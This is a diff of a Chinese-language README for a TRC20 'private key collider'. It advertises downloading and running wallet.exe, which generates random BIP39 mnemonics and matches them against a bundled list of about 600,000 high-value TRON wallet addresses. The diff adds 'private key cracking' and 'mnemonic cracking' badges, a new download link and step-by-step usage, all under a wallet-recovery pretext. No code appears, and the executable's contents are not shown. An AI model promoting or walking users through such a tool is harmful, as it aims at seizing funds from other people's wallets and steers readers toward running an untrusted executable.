@@ -4,57 +4,60 @@
 <h4 align="center">咸鱼私钥碰撞器（Trc20）</h4>
 <p align="center">版本：v1.0.0</p>
 <p align="center">
-  <a href="README.md">
-    <img src="https://img.shields.io/badge/-简体中文-red.svg" style="margin:0 5px">
-  </a>
-  <a href="README_zh-TW.md">
-    <img src="https://img.shields.io/badge/-繁体中文-brightgreen.svg" style="margin:0 5px">
-  </a>
-  <a href="README_EN.md">
-    <img src="https://img.shields.io/badge/-English-yellow.svg" style="margin:0 5px">
-  </a>
-  <a href="README_ja.md">
-    <img src="https://img.shields.io/badge/-日本語-green.svg" style="margin:0 5px">
-  </a>
-  <a href="README_ko.md">
-    <img src="https://img.shields.io/badge/-한국어-blue.svg" style="margin:0 5px">
-  </a>
-  <a href="README_es.md">
-    <img src="https://img.shields.io/badge/-Español-purple.svg" style="margin:0 5px">
-  </a>
+    <img src="https://img.shields.io/badge/-私钥碰撞-red.svg" style="margin:0 5px">
+    <img src="https://img.shields.io/badge/-私钥破解-brightgreen.svg" style="margin:0 5px">
+    <img src="https://img.shields.io/badge/-助记词找回-yellow.svg" style="margin:0 5px">
+    <img src="https://img.shields.io/badge/-助记词破解-green.svg" style="margin:0 5px">
+    <img src="https://img.shields.io/badge/-区块链-blue.svg" style="margin:0 5px">
+    <img src="https://img.shields.io/badge/-波场-purple.svg" style="margin:0 5px">
 </p>
-
-
-<img alt="logo"  src="./img/main_jtzw.png">
 
 ## 项目简介
 
 咸鱼私钥碰撞器是一款专注于TRC20（波场链）的私钥碰撞智能系统。该软件通过遵循BIP39协议随机生成12位助记词，并根据生成后的地址与导入的监控地址进行比较，以找回早期低价买入后忘记助记词的TRC20钱包。
 
-## 适用人群
-- 助记词/密钥丢失，需要找回的用户
-- 拥有闲置电脑，希望自动化运行程序的用户
-- 佛系运行者，依赖运气寻找机会的用户
+## 界面预览
 
-## 软件优势
-
-1. **专注TRC20**：专为波场链设计，优化了碰撞算法，提高了碰撞效率。
-2. **高效碰撞**：支持大规模并行计算，显著提高碰撞速度。
-3. **用户友好**：简洁直观的用户界面，易于操作，无需专业知识。
-4. **持续更新**：定期更新软件，修复漏洞，增加新功能，保持软件的先进性。
-5. **监控大额钱包**：持续监控大额钱包，及时更新碰撞目标，提高成功率。
-6. **离线运行**：支持离线断网运行，保护用户隐私，避免网络攻击。
-7. **价格优势**：相比市面上的其他碰撞器，价格更加优化，性价比高。
-8. **多语言支持**：支持多种语言界面，满足不同地区用户的需求。
-9. **安全性高**：采用先进的加密技术，保护用户的助记词和私钥安全。
-10. **社区支持**：拥有活跃的社区，用户可以在社区中获取帮助和支持。
+<p><img alt="logo"  src="./img/index1.png"></p>
+<p><img alt="logo"  src="./img/index2.png"></p>
 
 ## 安装步骤
 
-1. 下载并解压安装包，[点击这里进行下载](https://github.com/EthCollision/wallet_collission/releases/download/v2.0.0/trx_collision.rar)
-2. 将需要碰撞的钱包地址放入`input`目录(目前自带60w大额钱包地址)
-3. 运行`wallet.exe`启动程序
-4. 运行成功后，【开启】 按钮即可
+### 1.下载软件包：
+<p>
+下载并解压安装包，<a href="https://github.com/EthCollision/WalletExchange/releases/download/wallet2.0.0/trx_collision2.0.zip">点击下载</a>
+</p>
+
+### 2.私钥碰撞：
+
+<p>1.将需要碰撞的钱包地址放入`input`目录(目前自带60w大额钱包地址)</p>
+<p>2.运行`wallet.exe`启动程序</p>
+<p>3.运行成功后，【开启】 按钮即可</p>
+
+### 3.助记词找回：
+<p>1.输入要找回的【目标钱包】地址</p>
+<p>2.选择每个助记词【规则】，注意，助记词越准确，顺序越对，找回速度越快</p>
+<p>3.点击【开启】按钮，等待结果</p>
+<p><img src="https://img.shields.io/badge/-规则解释如下：-red.svg" style="margin:0 5px"></p>
+<p><strong>精确规则</strong>：如果该位置助记词记得，并且助记词属于完全正确，可以选择该模式</p>
+<p><strong>随机规则</strong>：如果该位置的助记词忘记了，可以选择该模式</p>
+<p><strong>以什么开头规则</strong>：如果该位置的助记词记得以为什么开头的话，可以选择该模式，例如:如果助记词是shop，可以输入s或者sh等</p>
+<p><strong>以什么结尾规则</strong>：如果该位置的助记词记得以为什么结尾的话，可以选择该模式，例如:如果助记词是shop，可以输入p或者op等</p>
+<p><strong>包含规则</strong>：如果该位置的助记词记得是含有某一个字母的话，可以选择该模式，例如:如果助记词是shop，可以输入p或者s等</p>
+
+
+## 运行示例
+<table>
+    <tr>
+        <td ><img alt="logo"  src="./img/lizi1.png"></td>
+        <td ><img alt="logo"  src="./img/lizi2.png"></td>
+    </tr>
+    <tr>
+        <td ><img alt="logo"  src="./img/lizi3.png"></td>
+        <td ><img alt="logo"  src="./img/lizi4.png"></td>
+    </tr>
+</table>
+
 
 ## 目录结构
 
